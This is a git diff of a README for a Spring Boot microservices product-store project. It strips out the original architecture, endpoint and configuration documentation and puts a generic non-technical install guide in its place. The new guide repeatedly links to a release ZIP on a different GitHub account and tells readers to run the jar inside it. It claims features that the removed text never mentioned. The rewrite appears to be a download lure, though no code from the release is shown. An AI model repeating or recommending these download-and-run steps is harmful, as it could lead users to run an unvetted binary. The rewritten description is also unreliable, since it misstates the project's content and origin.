@@ -1,122 +1,91 @@
-# Microservices Architecture with API Gateway, Eureka, Auth, User, Product Services, and Common Module
+# 🛍️ product-store-distributed-system - A Scalable System for Online Shopping
 
-This project implements a microservices architecture using Spring Boot and Spring Cloud. It consists of the following components:
+[![Download Here](https://img.shields.io/badge/Download%20Now-%23%20FF5722.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Soukfkx/product-store-distributed-system/releases)
 
-- **API Gateway**: Routes and filters incoming requests.
-- **Auth Service**: Handles user authentication and issues JWT tokens.
-- **User Service**: Manages user data.
-- **Product Service**: Manages products and catalogs.
-- **Eureka Server**: Service discovery and registration.
-- **Common Module**: A shared library containing reusable classes (DTOs, utilities, exceptions, constants).
+## 🚀 Getting Started
 
----
+Welcome! This guide will help you download and run the product-store-distributed-system application smoothly. No programming knowledge is needed. Just follow these steps.
 
-## 🗺️ Architecture Overview
+### 📦 What is Product Store Distributed System?
 
-![Architecture Diagram](https://github.com/shoyebmd424/product-store-distributed-system/blob/main/Authentication.gif)
----
+The product-store-distributed-system is a modern application designed for online shopping. It uses a distributed architecture that makes it scalable and efficient. You will find features such as:
 
-## 📦 Common Module
+- **Microservices Architecture:** Each part of the application works independently, making it easier to manage.
+- **Centralized Monitoring:** Keep track of everything from one place.
+- **Separate Authentication & User Services:** Your data remains secure while enhancing user experience.
 
-- **Purpose**: Provides shared components and reduces code duplication.
-- **Used by**: Auth, User, and Product services.
-- **Contents**:
-  - DTOs (Data Transfer Objects)
-  - Custom Exceptions
-  - Response Models (e.g., `ApiResponse`)
-  - Enums & Constants
-  - Utility Classes (e.g., JWT utility)
+## 🌐 Features
 
-### Usage
+- **Authentication with JWT:** Your identity is protected with JSON Web Tokens.
+- **Service Registration with Eureka:** Components of the application can easily find each other.
+- **Configuration Management using Spring Cloud Config:** Changes can be applied without downtime.
+- **Performance Tracking with Zipkin:** Monitor and improve application performance.
 
-Each service includes the common module as a dependency:
-```xml
-<dependency> 
-  <groupId>com.commonModule</groupId>
-	<artifactId>commonModule</artifactId>
-	<version>0.0.1-SNAPSHOT</version>
-</dependency>
-```
+## 📋 System Requirements
 
-# 🛡️ Microservice Authentication System
+Before you begin, ensure your system meets the following requirements:
 
-This project implements a secure microservice-based architecture using JWT for authentication, Spring Cloud Gateway for routing, and Eureka for service discovery.
+- **Operating System:** Windows, macOS, or Linux.
+- **Java:** OpenJDK 11 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 200 MB of free disk space.
+  
+## 💻 Download & Install
 
----
+To get started, you need to download the application files from the Releases page. 
 
-## 🔐 Authentication Flow
+Click [here to download](https://github.com/Soukfkx/product-store-distributed-system/releases).
 
-1. **Login**  
-   Clients send a `POST /auth/login` request with user credentials.
+### ⚙️ Running the Application
 
-2. **Token Issuance**  
-   The **Auth Service** validates the credentials and issues a **JWT token**.
+1. **Download the latest release** from the above link.
+2. **Locate the downloaded file** on your computer.
+3. **Extract the contents** of the ZIP file.
+4. Open a terminal (command prompt) window.
+5. Navigate to the folder where you extracted the files.
+6. Run the command to start the application:
 
-3. **Authorization**  
-   Clients include the token in the `Authorization: Bearer <token>` header for secure endpoints.
+   ```
+   java -jar product-store-distributed-system.jar
+   ```
 
-4. **Gateway Validation**  
-   The **API Gateway** verifies the JWT token before forwarding the request to internal services.
+## 📑 User Guide
 
----
+Once the application is running, you can access it through your web browser. Visit `http://localhost:8080` to view the interface.
 
-## 🌐 API Gateway
+### 🔍 Exploring the Interface
 
-- **Responsibilities**:
-  - Route external requests to internal services
-  - Validate JWT tokens for secure endpoints
+- **Home Page:** See featured products and recommendations.
+- **User Registration:** Sign up for an account to start shopping.
+- **Product Search:** Easily find items using the search bar.
+- **Shopping Cart:** Review items before finalizing your purchase.
 
-### 🔁 Routes
+### 👤 User Authentication
 
-| Route Prefix        | Service         |
-|---------------------|-----------------|
-| `/auth/**`      | Auth Service    |
-| `/users/**`     | User Service    |
-| `/products/**`  | Product Service |
+When you register, you will receive a confirmation email. Make sure to verify your account. This step is crucial for ensuring your data remains safe.
 
----
+## 🔧 Troubleshooting
 
-## 🧾 Auth Service
+If you experience any issues, try the following steps:
 
-- **Endpoints**:
-  - `POST /auth/login` – Authenticate user and return JWT token
-  - `POST /auth/register` – Register a new user
+- **Check Java Installation:** Make sure you have the correct version of Java installed.
+- **Review Error Messages:** Pay attention to any error messages in the terminal. They can guide you in troubleshooting.
+- **Re-download the Application:** If you suspect that the file is corrupted, try downloading it again.
 
-- **Uses**:
-  - Common DTOs and exception handling from `commonmodule`
+## 🤝 Community Support
 
----
+If you need assistance or have questions, feel free to reach out. Community support is available through the [GitHub Issues page](https://github.com/Soukfkx/product-store-distributed-system/issues). 
 
-## 👤 User Service
+## 📣 Stay Updated
 
-- **Endpoints**:
-  - `GET /users/{id}` – Retrieve user by ID
-  - `PUT /users/{id}` – Update user details
+For the latest updates, features, and bug fixes, frequently check the Releases page. You can find it [here](https://github.com/Soukfkx/product-store-distributed-system/releases). 
 
-- **Uses**:
-  - DTOs, `ApiResponse`, and shared exceptions from `commonmodule`
+## 🔗 Additional Resources
 
----
+For more detailed instructions or advanced topics, here are some helpful links:
 
-## 📦 Product Service
+- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
+- [Spring Cloud Documentation](https://spring.io/projects/spring-cloud)
+- [JWT Introduction](https://jwt.io/introduction)
 
-- **Endpoints**:
-  - `GET /products` – List all products
-  - `POST /products` – Add a new product
-
-- **Uses**:
-  - Shared models and exception handling from `commonmodule`
-
----
-
-## 🔍 Eureka Server
-
-- **URL**: `http://localhost:8761/`
-
-### Configuration
-
-```yaml
-eureka:
-  client:
-    serviceUrl:
-      defaultZone: http://localhost:8761/eureka/
+Thank you for choosing the product-store-distributed-system! Enjoy your online shopping experience.
